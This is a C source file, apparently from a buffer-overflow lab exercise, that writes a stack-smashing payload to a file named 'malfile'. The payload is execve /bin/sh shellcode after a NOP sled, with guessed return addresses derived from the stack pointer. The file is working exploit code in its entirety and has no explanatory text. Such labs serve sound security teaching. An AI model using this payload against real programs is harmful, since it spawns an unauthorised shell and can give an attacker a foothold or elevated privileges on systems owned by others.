#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char code[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdql                           */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

unsigned long stackPointer(void)
{
    __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
    char buffer[517];
    
    FILE *malfile;

    memset(&buffer, 0x90, 517);

    char *ptr = buffer; 

    int base = sizeof(buffer) - (sizeof(code) + 1);

    long *addressPointer = (long*)(ptr);

    long returnAddress = stackPointer() + 500;

    int i = 0;

    while(i < 20) {
      *(addressPointer++) = returnAddress;
      i++;
    }

    i = 0;

    while(i < sizeof(code)) { 
      buffer[base + i] = code[i];
      i++;
    }

    buffer[sizeof(buffer) - 1] = '\0';
    
    malfile = fopen("./malfile", "w");
    fwrite(buffer, 517, 1, malfile);
    fclose(malfile);
}
